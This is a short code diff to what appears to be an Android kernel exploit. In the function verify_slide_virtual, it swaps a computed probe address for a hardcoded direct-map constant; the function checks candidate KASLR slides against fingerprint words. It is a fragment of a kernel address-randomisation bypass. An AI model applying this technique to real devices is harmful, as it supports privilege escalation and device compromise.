@@ -87,10 +87,7 @@ static int verify_slide_virtual(int ashmem_fd) {
        idx++) {
     uintptr_t slide = p0_fingerprints[idx].slide;
     /* Use DIRECT MAP virtual address, not kernel text address */
-    uintptr_t probe_base = APP_KERNEL_PAGE_KSNITCH_IDENTITY_BASE
-                         + (uintptr_t)kernel_phys_load
-                         + P0_ORACLE_PROBE_OFFSET
-                         - slide;
+        uintptr_t probe_base = 0xffffff8080000000ULL + P0_ORACLE_PROBE_OFFSET - slide;
 
     int match = 1;
     for (int w = 0; w < P0_FINGERPRINT_WORDS; w++) {
